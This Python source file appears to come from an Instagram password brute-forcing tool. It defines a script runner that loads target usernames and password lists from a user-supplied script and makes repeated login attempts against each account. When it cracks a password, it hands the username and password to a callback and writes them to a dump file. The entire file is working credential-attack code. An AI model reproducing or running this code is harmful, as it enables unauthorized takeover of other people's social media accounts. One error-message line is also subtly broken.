import os
from .InstagramPyCLI import InstagramPyCLI
from .InstagramPySession import InstagramPySession, DEFAULT_PATH
from .InstagramPyInstance import InstagramPyInstance
from .InstagramPyDumper import InstagramPyDumper
from datetime import datetime
from .AppInfo import appInfo as AppInformation


class InstagramPyScript():
    script_code = None
    pService = None
    cli = None
    threads = {}
    no_of_threads = len(threads)

    def __init__(self, script, PortableService=None):
        self.cli = InstagramPyCLI(appinfo=AppInformation,
                                  started=datetime.now(),
                                  verbose_level=0,
                                  username='',
                                  PortableService=PortableService
                                  )
        self.cli.PrintHeader()
        self.cli.PrintDatetime()
        self.pService = PortableService

        if not os.path.isfile(script):
            self.cli.ReportError("no script found at {}".script)

        with open(script, 'r') as f:
            self.script_code = compile(f.read(), script, 'exec')

    def run(self):
        try:
            exec(self.script_code, globals())
            count = 0
            for i in usernames:
                try:
                    cli = InstagramPyCLI(
                        appinfo=AppInformation,
                        started=datetime.now(),
                        verbose_level=i['verbose'],
                        username=i['id'],
                        PortableService=self.pService
                    )
                except:
                    cli = InstagramPyCLI(
                        appinfo=AppInformation,
                        started=datetime.now(),
                        verbose_level=0,
                        username=i['id'],
                        PortableService=self.pService
                    )

                INSTAPY_CONFIG = DEFAULT_PATH
                if self.pService is not None:
                    if self.pService.isSetInstagramPyPortable():
                        INSTAPY_CONFIG = self.pService.getInstagramPyConfigPath()

                try:
                    session = InstagramPySession(
                        i['id'],
                        i['password_list'],
                        INSTAPY_CONFIG,
                        DEFAULT_PATH,
                        cli
                    )
                except:
                    try:
                        session = InstagramPySession(
                            i['id'],
                            global_password_list,
                            INSTAPY_CONFIG,
                            DEFAULT_PATH,
                            cli
                        )
                    except:
                        self.cli.ReportError(
                            "\033[1;32m[\033[1;31m!\033[1;32m]\033[1;31minvalid script :: No Password list is Mentioned in the Script!\033[0m")
                try:
                    session.ReadSaveFile(i['continue'])
                except:
                    session.ReadSaveFile(False)

                instance = InstagramPyInstance(cli, session)

                self.threads[count] = {
                    "terminated": False,
                    "instance": instance
                }
                try:
                    self.threads[count]['callback'] = i['callback']
                except:
                    try:
                        self.threads[count]['callback'] = global_callback
                    except:
                        self.threads[count]['callback'] = None
                count += 1
        except Exception as e:
            self.cli.ReportError("invalid script :: {}".format(e))

        self.no_of_threads = len(self.threads)
        while self.no_of_threads != 0:
            for i in self.threads:
                if self.threads[i]['terminated'] is True:
                    continue
                elif self.threads[i]['instance'].PasswordFound():
                    if self.threads[i]['callback'] is not None:
                        self.threads[i]['callback'](
                            self.threads[i]['instance'].session.username,
                            self.threads[i]['instance'].session.CurrentPassword()
                        )
                        self.threads[i]['instance'].session.WriteDumpFile(
                            {
                                "id": self.threads[i]['instance'].session.username,
                                "password": self.threads[i]['instance'].session.CurrentPassword(),
                                "started": str(self.threads[i]['instance'].cli.started)
                            }
                        )

                    self.threads[i]['terminated'] = True
                    self.no_of_threads -= 1
                else:
                    self.threads[i]['instance'].TryPassword()
